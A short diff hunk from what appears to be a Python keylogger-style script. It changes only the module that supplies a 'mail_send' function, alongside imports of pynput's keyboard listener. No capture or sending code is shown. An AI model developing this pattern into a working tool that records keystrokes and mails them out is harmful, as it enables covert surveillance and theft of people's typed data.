@@ -3,7 +3,7 @@ import datetime
 from pynput import keyboard as kb
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
-from newmail import mail_send
+from mailsender import mail_send
 
 
 
